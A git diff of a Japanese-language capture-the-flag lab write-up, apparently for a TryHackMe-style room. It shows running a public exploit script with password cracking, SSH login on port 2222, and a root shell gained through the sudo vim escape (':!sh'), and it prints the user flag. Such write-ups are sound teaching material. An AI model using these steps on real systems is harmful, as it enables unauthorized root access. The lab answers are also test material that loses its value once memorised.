@@ -267,7 +267,7 @@ python2 46635.py -u http://10.49.141.85/simple --crack -w /usr/share/wordlists/r
 
 
 6 **Where can you login with the details obtained?**  
-問１で調査したnmap結果から　ssh　と回答  
+問１で調査したnmap結果からsshと回答  
 ssh -p 2222 mitch@IP (ポート指定しないとつながらない)　
 ※ポート指定しないとデフォルトの22につなごうとしてしまう
 
@@ -276,4 +276,21 @@ ssh -p 2222 mitch@IP (ポート指定しないとつながらない)　
 $ cat user.txt
 G00d j0b, keep up!
 
-8 **Is there any other user in the home directory? What's its name?**
+8 **Is there any other user in the home directory? What's its name?**  
+$ cd /home
+$ ls -l
+total 8
+drwxr-x---  3 mitch   mitch   4096 aug 19  2019 mitch
+drwxr-x--- 16 sunbath sunbath 4096 aug 19  2019 sunbath  
+上記コマンド結果よりsunbathと回答。
+
+9 **What can you leverage to spawn a privileged shell?**
+権限昇格するために初めにsudo -l を実施  
+結果  
+(root) NOPASSWD: /usr/bin/vim  
+vimがroot権限で動かせれることを確認できたため、vimと回答
+
+10 **What's the root flag?**
+sudo vimでエディタが開いた後に:!sh
+もしくは　sudo vim -c ':!sh'
+をすることでroot昇格
